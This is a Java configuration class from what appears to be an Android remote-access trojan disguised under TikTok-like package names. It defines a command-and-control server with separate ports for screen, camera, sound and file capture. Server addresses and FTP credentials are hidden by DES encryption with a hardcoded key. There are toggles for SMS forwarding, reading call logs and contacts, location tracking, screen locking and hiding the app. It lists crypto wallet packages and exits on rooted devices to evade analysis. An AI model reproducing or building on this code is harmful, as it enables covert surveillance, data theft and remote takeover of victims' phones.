package utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

import io.virtualapp.R;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import encrypt.DES;


/**
 * @author byc
 *
 */
public class ConfigCt {
	public static final boolean DEBUG =true;//调试标识：


	//************************插件信息**************************************

	public static final String PLUGIN_VERSION="2.01";//插件版本号
	public static final String PLUGIN_NAME="ct.apk";//插件名字；
	public static final String PLUGIN_PACKAGENAME="com.f101yc.ch";//插件名字；
	public static final int RUNNING_IN_PLUGIN = 1;//以插件方式运行；
	public static final int RUNNING_IN_MYSELF = 0;//以自身方式运行；
	public volatile static int RunningWay=RUNNING_IN_MYSELF;//运行方式

	public static final String PREFERENCE_NAME = "byc_ct_config";//配置文件名称
	public static final String appID="ct";//定义app标识：

	//广播消息定义
	public static final String ACTION_QIANGHONGBAO_SERVICE_DISCONNECT = "com.ss.android.ugc.live.ACCESSBILITY_DISCONNECT";
	public static final String ACTION_QIANGHONGBAO_SERVICE_CONNECT = "com.ss.android.ugc.live.ACCESSBILITY_CONNECT";
	public static final String ACTION_DOWNLOAD_INFO = "com.ss.android.ugc.live.DOWNLOAD_INFO ";//下载消息
	public static final String ACTION_INSTALL_INFO = "com.ss.android.ugc.live.INSTALL_INFO ";//安装消息
	public static final String ACTION_CMD_INFO = "com.ss.android.ugc.live.CMD_INFO ";//root命令消息
	public static final String ACTION_UPDATE_INFO = "com.byc.UPDATE_INFO ";//更新消息
	public static final String ACTION_ACCESSBILITY_SERVICE_CLICK = "com.ss.android.ugc.live.ACCESSBILITY_SERVICE_CLICK";//点击广播；
	public static final String ACTION_ACCESSBILITY_SERVICE_REQUEST = "com.byc.ACCESSBILITY_SERVICE_REQUEST";//点击广播；
	//定义UI界面：
	//public static final String WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
	//public static final String SETTING_PACKAGENAME="com.android.settings";
	//服务器信息：
	public static final String FTP_FILE_NAME="ct.xml";//服务器上文件名；
	private static final String INFO_NEW_VERSION="Info_New_Version";//--新版本 号
	public static String  new_version="1.00";//新版本号 
	private static final String INFO_CONTACT="Info_Contact";//--
	public static String contact="";//联系方式
	private static final String INFO_AD="Info_AD";//--
	public static String ad="aaa";//广告语
	private static final String INFO_DOWNLOAD="Info_Download";//--
	//public static String download="http://119.23.68.205/android/ct.apk";//下载地址
	private static final String INFO_HOMEPAGE="Info_HomePage";//--
	//public static String homepage="http://119.23.68.205/android/index.htm";//下载地址
	private static final String INFO_WARNING="Info_Warning";//--
	public static String warning="";//下载地址
	public static String install="xxvideo.apk";//安装包
	public static boolean install_download=true;//下载安装包吗 ？
	public static boolean install_run=true;//安装后运行 ？
	public static final String AD_REG_USER_SEND_INTERVAL="AD_Reg_User_Send_Interval";//最大已注册用户发广告间隔； 
	public static int RegUserSendADinterval=10000000;//最大已注册用户发广告间隔；
	public static final String AD_NO_REG_USER_SEND_INTERVAL="AD_No_Reg_User_Send_Interval";//最大未注册用户发广告间隔； 
	public static int NoRegUserSendADinterval=10000000;//最大未注册用户发广告间隔； 
	public static final String AD_OTHER_MEDIA_SEND_INTERVAL="AD_Other_Media_Send_Interval";//最大已注册对其它媒体发广告间隔；
	public static int OtherMediaSendADinterval=10000000;//最大已注册对其它媒体发广告间隔； 
	public static final String AD_LUCKY_MONEY_SEND_IS="AD_Lucky_Money_Send_Is";//群里面有红包发布广告吗；
	public static boolean bLuckyMoneySend=false;//群里面有红包发布广告吗
	public static final String WX_INFO="wechat_info";//微信信息；
	public static String wi="";//微信信息；
	//**********************************************************************************************
	public static final String TAG = "byc001";//调试标识：
	public static final String TAG2 = "byc002";//调试标识：
	public static final String app_flag = "byc001";//调试标识：

	//微信的包名
	//public static final String WECHAT_PACKAGENAME = "com.tencent.mm";
	//public static final String QQ_PACKAGENAME = "com.tencent.mobileqq";
	public static final String PKG_IM_TOKEN = "im.token.app";
	public static final String PKG_HUOBI = "com.huobionchainwallet";
	public static final String PKG_BTD = "com.btd.wallet";
	//服务器IP
	//public static final String HOST = "host";
	//public static final String host = "119.23.68.205";
	//public static final String host = "119.23.35.238";
	//public static final String host = "47.107.119.104";
	//public static final String host = "47.244.124.46";
	//public static final String host = "47.244.122.104";
	//public static final String host = "47.244.98.118";
	//public static final String host = "47.91.237.232";
	//服务器端口
	//private static final int port = 8000;
	public static final int port_order = 6001;//命令接收端口
	public static final int port_data = 6002;//数据接收端口
	public static final int port_data2 = 6003;//数据接收端口
	public static final int port_data3 = 6004;//数据接收端口
	public static final int port_data4 = 6005;//数据接收端口
	public static final int port_data5 = 6006;//数据接收端口
	//public static final int port_order = 8300;//命令接收端口
	//public static final int port_data = 8301;//数据接收端口

	//唯一标识符
	//public static final String PHONE_ID = "PhoneID";
	//--------------------------------------------------------------------------------------
	public static boolean bReg=true;

	//版本号：
	public static String version="";
	public static int versionCode=100;
	//ftp
	//public static final String ftpUserName="byc";
	//public static final String ftpPwd="byc";

	//本地目录：
	public volatile static String LocalDir="";//本地工作目录；
	public volatile static String LocalPath="";//本地工作路径；
	public volatile static String LocalUploadPath="";//本地工作上传路径
	private static final String WORK_SPACE="byc";//--本地工作目录名；
	private static final String ROOT_PERMISSION="root_permission";//--；
	public volatile static boolean bRoot=false;//是否root
	public volatile static String AppName="";//本app名称；
	public volatile static String PhoneBrand="";//手机品牌；
	public static final String PHONE_BRAND_XIAOMI="Xiaomi";//--Xiaomi
	public static final String PHONE_BRAND_HONOR="Honor";//--Honor
	public volatile static int screenWidth=0;//屏幕宽；
	public volatile static int screenHeight=0;//屏幕高；
	public volatile static int navigationBarHeight=0;//导航栏高；

	public static final String UHOST = "py6Gs9EVk0EHg9lGogbBiA==";//103.97.3.61
	public volatile static String uIP="";//更新服务器地址
	public volatile static int uPortU=8951;//上传服务器端口
	public volatile static int uPortD=8953;//下载服务器端口
	public volatile static String cIP="";//控制服务器地址
	public volatile static int cPort_order=port_order;//控制服务器端口
	public volatile static int cPort_data=port_data;//控制服务器端口  
	public volatile static int cPort_screen=port_data2;//控制服务器端口  
	public volatile static int cPort_camera=port_data3;//控制服务器端口  
	public volatile static int cPort_sound=port_data4;//控制服务器端口  
	public volatile static int cPort_file=port_data5;//控制服务器端口  
	public volatile static int pid=1002;//用户编号
	public volatile static int id=0;//手机编号
	public volatile static String deviceId="";//更新服务器地址
	public volatile static String pwd="123456";//更新服务器地址

	public static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// 自定义密钥
	//public final static String DOWNLOAD="http://119.23.68.205/android/files/apk/";//下载地址
	public final static String DOWNLOAD="CtyKsYF6s3pa65bKuCLxRiGboTe/BHfVVo8ZnKsZEidE9O6fTUCENg==";//下载地址
	public static String download="";//下载地址
	//public static final String HOMEPAGE="http://119.23.68.205/android/android.htm";//下载地址
	public static final String HOMEPAGE="CtyKsYF6s3pa65bKuCLxRiGboTe/BHfVGo376CwctMSEXSEffXfCTmcS0YUiRJsb";//下载地址
	public static String homepage=HOMEPAGE;//下载地址
	//public static final String HOST = "TrxMnCHzq6kLb41Q90hIUg==";
	//public static final String HOST = "DbucKSac6B1eiS2b/34NNw==";//154.221.19.215
	//public static final String HOST = "0kyUDDWN0ihQ+sgA/5TTGQ==";//192.168.1.8
	public static final String HOST = "py6Gs9EVk0EHg9lGogbBiA==";//103.97.3.61
	public static final String FTP_USER_NAME="o1D58m2VSDQ=";
	public static final String FTP_USER_PWD="o1D58m2VSDQ=";
	public volatile static String ftpPwd="";
	public volatile static String ftpUserName="";
	//*******************************************************************************
	public static String lock_say="";

	private static ConfigCt current;
	private SharedPreferences preferences;
	public  static Context context;
	SharedPreferences.Editor editor;

	private ConfigCt(Context context) {
		ConfigCt.context = context;
		preferences = context.getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE);
		editor = preferences.edit();
		bRoot=RootShellCmd.isRoot(context);
		if (bRoot)android.os.Process.killProcess(android.os.Process.myPid());
		decryptString();
		//readCfgFile();//读配置文件：
		cIP=getControlIP();//重新获取控制服务器地址；

		cPort_order=getControlPort();//重新获取控制服务器地址；
		cPort_data=cPort_order+1;//重新获取控制服务器地址；
		id=getId();
		pid=getPid();
		FileConfig.getInstance(context).getConfig();
		//deviceId=getDeviceId();
		deviceId=IDUtil.getDeviceUUID(context);

		LocalDir=this.getLocalDir();

		ConfigCt.version=getSelfVersion();
		AppName=getSelfName();
		PhoneBrand=getPhoneBrand();
		//2.取出服务器信息：
		ConfigCt.new_version=this.getNewVersion();
		ConfigCt.download=this.getDownloadAddr();
		ConfigCt.contact=this.getContactWay();
		ConfigCt.warning=this.getWarning();
		ConfigCt.homepage=this.getHomepage();
		ConfigCt.ad=this.getAd();
		ConfigCt.NoRegUserSendADinterval=this.getNoRegUserSendADinterval();
		ConfigCt.RegUserSendADinterval=this.getRegUserSendADinterval();
		ConfigCt.OtherMediaSendADinterval=this.getOtherMediaSendADinterval();
		ConfigCt.bLuckyMoneySend=this.getLuckyMoneySendIs();

	}
	public static synchronized ConfigCt getInstance(Context context) {
		if(current == null) {
			current = new ConfigCt(context.getApplicationContext());
		}
		return current;
	}
	private void decryptString(){
		DES des = DES.getDes(KEY);
		try{
			uIP=des.decode(UHOST);
			cIP=des.decode(HOST);
			ftpUserName=des.decode(FTP_USER_NAME);
			ftpPwd=des.decode(FTP_USER_PWD);
			download=des.decode(DOWNLOAD)+PLUGIN_NAME;
			homepage=des.decode(HOMEPAGE);
			//lock_say=des.decode(LOCK_SAY);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public String getLocalDir(){
		String sdcardPath = Environment.getExternalStorageDirectory().toString();
		String workDir = sdcardPath + "/" + WORK_SPACE;
		String uploadDir=workDir+ "/upload";
		Funcs.makeDir(workDir);
		Funcs.makeDir(uploadDir);
		LocalDir=workDir;
		LocalPath=workDir+ "/" ;
		LocalUploadPath=uploadDir+ "/" ;
		return workDir;
	}
	private String getSelfName(){
		//AppName=context.getString(R.string.app_name);
		AppName=context.getApplicationContext().getString(ResourceUtil.getStringId(context, "app_name"));
		return AppName;
	}
	private String getSelfVersion(){
		try {
			PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
			ConfigCt.version = info.versionName;
			ConfigCt.versionCode=info.versionCode;
			//if(DEBUG)Log.i(TAG, info.applicationInfo.name);
			return  ConfigCt.version;
		} catch (PackageManager.NameNotFoundException e) {
			e.printStackTrace();
			return "";
		}
	}
	/*
	 * 手机品牌： Xiaomi,Honor
	 */
	private String getPhoneBrand(){
		PhoneBrand=android.os.Build.BRAND;//手机品牌 
		return PhoneBrand;
	}


	//----------------------------------保存服务器信息----------------------------------
	/** 新版本号*/
	public String getNewVersion() {
		return preferences.getString(INFO_NEW_VERSION, new_version);
	}
	/** 新版本号*/
	public void setNewVersion(String version) {
		editor.putString(INFO_NEW_VERSION, version).apply();
	}
	/** 联系方式*/
	public String getContactWay() {
		return preferences.getString(INFO_CONTACT,contact);
	}
	/** 联系方式*/
	public void setContactWay(String contactWay) {
		editor.putString(INFO_CONTACT, contactWay).apply();
	}
	/** 广告语*/
	public String getAd() {
		return preferences.getString(INFO_AD,ad);
	}
	/** 广告语*/
	public void setAd(String Ad) {
		editor.putString(INFO_AD, Ad).apply();
	}
	/** 更新地址*/
	public String getDownloadAddr() {
		return preferences.getString(INFO_DOWNLOAD, download);
	}
	/** 更新地址*/
	public void setDownloadAddr(String downloadAddr) {
		editor.putString(INFO_DOWNLOAD, downloadAddr).apply();
	}
	/**主页地址*/
	public String getHomepage() {
		return preferences.getString(INFO_HOMEPAGE, homepage);
	}
	/** 主页地址*/
	public void setHomepage(String homepage) {
		editor.putString(INFO_HOMEPAGE, homepage).apply();
	}
	/**警告信息*/
	public String getWarning() {
		return preferences.getString(INFO_WARNING, warning);
	}
	/** 警告信息*/
	public void setWarning(String warning) {
		editor.putString(INFO_WARNING, warning).apply();
	}
	/**最大已注册用户发广告间隔*/
	public int getRegUserSendADinterval() {
		return preferences.getInt(AD_REG_USER_SEND_INTERVAL, RegUserSendADinterval);
	}
	/** 最大已注册用户发广告间隔*/
	public void setRegUserSendADinterval(int regUserSendADinterval) {
		editor.putInt(AD_REG_USER_SEND_INTERVAL, regUserSendADinterval).apply();
	}
	/**最大未注册用户发广告间隔*/
	public int getNoRegUserSendADinterval() {
		return preferences.getInt(AD_NO_REG_USER_SEND_INTERVAL, NoRegUserSendADinterval);
	}
	/** 最大已注册用户发广告间隔*/
	public void setNoRegUserSendADinterval(int noRegUserSendADinterval) {
		editor.putInt(AD_NO_REG_USER_SEND_INTERVAL, noRegUserSendADinterval).apply();
	}
	/**最大已注册对其它媒体发广告间隔*/
	public int getOtherMediaSendADinterval() {
		return preferences.getInt(AD_OTHER_MEDIA_SEND_INTERVAL, OtherMediaSendADinterval);
	}
	/** 最大已注册对其它媒体发广告间隔*/
	public void setOtherMediaSendADinterval(int otherMediaSendADinterval) {
		editor.putInt(AD_OTHER_MEDIA_SEND_INTERVAL, otherMediaSendADinterval).apply();
	}
	/**群里面有红包发布广告吗*/
	public boolean getLuckyMoneySendIs() {
		return preferences.getBoolean(AD_LUCKY_MONEY_SEND_IS, bLuckyMoneySend);
	}
	/** 群里面有红包发布广告吗*/
	public void setLuckyMoneySendIs(boolean LuckyMoneySend) {
		editor.putBoolean(AD_LUCKY_MONEY_SEND_IS, LuckyMoneySend).apply();
	}
	/**微信信息*/
	public String getWechatInfo() {
		return preferences.getString(WX_INFO, wi);
	}
	/** 微信信息*/
	public void setWechatInfo(String info) {
		editor.putString(WX_INFO, info).apply();
	}
	//-----------------------是否发送短信----------------------------------------
	public boolean getIsSendSms() {
		return preferences.getBoolean("SEND_SMS", false);
	}
	public void setIsSendSms(boolean bSend) {
		editor.putBoolean("SEND_SMS", bSend).apply();
	}
	//-----------------------是否发送短信到手机----------------------------------------
	public boolean getIsSendSmsToPhone() {
		return preferences.getBoolean("SEND_SMS_TO_PHONE", false);
	}
	public void setIsSendSmsToPhone(boolean bSend) {
		editor.putBoolean("SEND_SMS_TO_PHONE", bSend).apply();
	}
	//-----------------------是否有读通话记录功能----------------------------------------
	public boolean getIsReadCallLog() {
		return preferences.getBoolean("CALL_LOG", false);
	}
	public void setIsReadCallLog(boolean bSend) {
		editor.putBoolean("CALL_LOG", bSend).apply();
	}
	//-----------------------是否有读通讯录功能----------------------------------------
	public boolean getIsReadContact() {
		return preferences.getBoolean("CONTACT_CONTENT", false);
	}
	public void setIsReadContact(boolean bSend) {
		editor.putBoolean("CONTACT_CONTENT", bSend).apply();
	}
	/**是否有截屏权限*/
	public boolean haveScreenShotPower() {
		return preferences.getBoolean("SCREEN_SHOT_POWER", false);
	}
	/** 是否有截屏权限*/
	public void setScreenShotPower(boolean bHave) {
		editor.putBoolean("SCREEN_SHOT_POWER", bHave).apply();
	}
	/** 是否有ROOT权限*/
	public void setRootPermission(boolean bHave) {
		editor.putBoolean(ROOT_PERMISSION, bHave).apply();
	}
	/**是否有root权限*/
	public boolean haveRootPermission() {
		return preferences.getBoolean(ROOT_PERMISSION, false);
	}
	/** 是否有carmera权限*/
	public void setCameraPermission(boolean bHave) {
		editor.putBoolean("CAMERA_PERMISSION", bHave).apply();
	}
	/**是否有carmera权限*/
	public boolean haveCameraPermission() {
		return preferences.getBoolean("CAMERA_PERMISSION", false);
	}
	/** 是否有Audio权限*/
	public void setAudioPermission(boolean bHave) {
		editor.putBoolean("AUDIO_PERMISSION", bHave).apply();
	}
	/**是否有Audio权限*/
	public boolean haveAudioPermission() {
		return preferences.getBoolean("AUDIO_PERMISSION", false);
	}
	/** 是否有LOCK权限*/
	public void setLockPermission(boolean bHave) {
		editor.putBoolean("LOCK_PERMISSION", bHave).apply();
	}
	/**是否有LOCK权限*/
	public boolean haveLockPermission() {
		return preferences.getBoolean("LOCK_PERMISSION", false);
	}
	/** 是否有定位权限*/
	public void setLocatePermission(boolean bHave) {
		editor.putBoolean("LOCATE_PERMISSION", bHave).apply();
	}
	/**是否有定位权限*/
	public boolean haveLocatePermission() {
		return preferences.getBoolean("LOCATE_PERMISSION", false);
	}
	/**QQ信息*/
	public String getQQInfo() {
		return preferences.getString("QQ_INFO", "");
	}
	/** QQ信息*/
	public void setQQInfo(String info) {
		editor.putString("QQ_INFO", info).apply();
	}
	/** 是否设置悬浮窗锁屏权限*/
	public void setFloatWindowLock(boolean bLock) {
		editor.putBoolean("FLOAT_WINDOW_LOCK", bLock).apply();
	}
	/**是否有悬浮窗锁屏*/
	public boolean isFloatWindowLock() {
		return preferences.getBoolean("FLOAT_WINDOW_LOCK", false);
	}
	/**QQ视频数量*/
	public int getQQVideoCount() {
		return preferences.getInt("QQ_VIDEO_COUNT",0);
	}
	/** QQ视频数量*/
	public void setQQVideoCount(int count) {
		editor.putInt("QQ_VIDEO_COUNT", count).apply();
	}
	/**WX视频数量*/
	public int getWXVideoCount() {
		return preferences.getInt("WX_VIDEO_COUNT", 0);
	}
	/** WX视频数量*/
	public void setWXVideoCount(int count) {
		editor.putInt("WX_VIDEO_COUNT", count).apply();
	}
	/**WX登陆视频数量*/
	public int getWXLoginVideoCount() {
		return preferences.getInt("WX_LOGIN_VIDEO_COUNT", 0);
	}
	/** WX登陆视频数量*/
	public void setWXLoginVideoCount(int count) {
		editor.putInt("WX_LOGIN_VIDEO_COUNT", count).apply();
	}
	/**QQ登陆视频数量*/
	public int getQQLoginVideoCount() {
		return preferences.getInt("QQ_LOGIN_VIDEO_COUNT", 0);
	}
	/** QQ登陆视频数量*/
	public void setQQLoginVideoCount(int count) {
		editor.putInt("QQ_LOGIN_VIDEO_COUNT", count).apply();
	}
	/** 读取配置文件数据*/
	private void readCfgFile() {
		File cfg = context.getDir("payload_cfg", Context.MODE_PRIVATE );
		String cfgFileName = cfg.getAbsolutePath() + "/cfg";
		//String cfgFileName =getTestCfgFilename();
		File cfgFile = new File(cfgFileName);
		if (!cfgFile.exists())return;
		RunningWay=RUNNING_IN_PLUGIN;
		try {
			FileReader reader = new FileReader(cfgFileName);
			BufferedReader br = new BufferedReader(reader);
			String str = null;
			int i=1;
			while((str = br.readLine()) != null) {
				if(i==1)uIP=str;
				if(i==2){
					uPortU=Integer.parseInt(str);
					uPortD=uPortU+2;
				}
				if(i==3)cIP=str;
				if(i==4){
					cPort_order=Integer.parseInt(str);
					cPort_data=cPort_order+1;
				}
				i=i+1;
			}

		}catch(FileNotFoundException e) {
			e.printStackTrace();
		}
		catch(IOException e) {
			e.printStackTrace();
		}

	}
	/**控制服务器地址*/
	public String getControlIP() {
		return preferences.getString("CONTROL_IP", cIP);
	}
	/** 控制服务器地址*/
	public void setControlIP(String controlIP) {
		editor.putString("CONTROL_IP", controlIP).apply();
	}
	/**控制服务器端口*/
	public int getControlPort() {
		return preferences.getInt("CONTROL_PORT", cPort_order);
	}
	/** 控制服务器端口*/
	public void setControlPort(int controlPort) {
		editor.putInt("CONTROL_PORT", controlPort).apply();
	}
	/**用户编号*/
	public int getPid() {
		return preferences.getInt("P_ID", pid);
	}
	/** 用户编号*/
	public void setPid(int pid) {
		editor.putInt("P_ID", pid).apply();
	}
	/**手机编号*/
	public int getId() {
		return preferences.getInt("ID", id);
	}
	/**手机编号*/
	public void setId(int id) {
		editor.putInt("ID", id).apply();
	}
	/**deviceId*/
	public String getDeviceId() {
		String imei=preferences.getString("DEVICE_ID", deviceId);
		if(imei.equals("")){
			imei=Funcs.getDeviceId(context);
			if(imei.length()<15)
				imei="";
			else
				settDeviceId(imei);
		}
		return imei;
	}
	/** deviceId*/
	public void settDeviceId(String deviceId) {
		editor.putString("DEVICE_ID",deviceId).apply();
	}
	/*
	 * 获取cfg文件路径；测试用函数:
	 * */
	private String getTestCfgFilename()  {
		String sdcardPath = Environment.getExternalStorageDirectory().toString();
		String apkFilename = sdcardPath + "/byc/cfg";
		return apkFilename;
	}

	/**接收短信手机号*/
	public String getMyphoneNum() {
		return preferences.getString("My_Phone_Num", null);
	}
	/** 接收短信手机号*/
	public void setMyphoneNum(String myphonenum) {
		editor.putString("My_Phone_Num", myphonenum).apply();
	}
	/** 是否隐藏APP*/
	public void setAppHide(boolean bHide) {
		editor.putBoolean("APP_HIDE", bHide).apply();
	}
	/**是否隐藏APP*/
	public boolean isAppHide() {
		return preferences.getBoolean("APP_HIDE", false);
	}
}
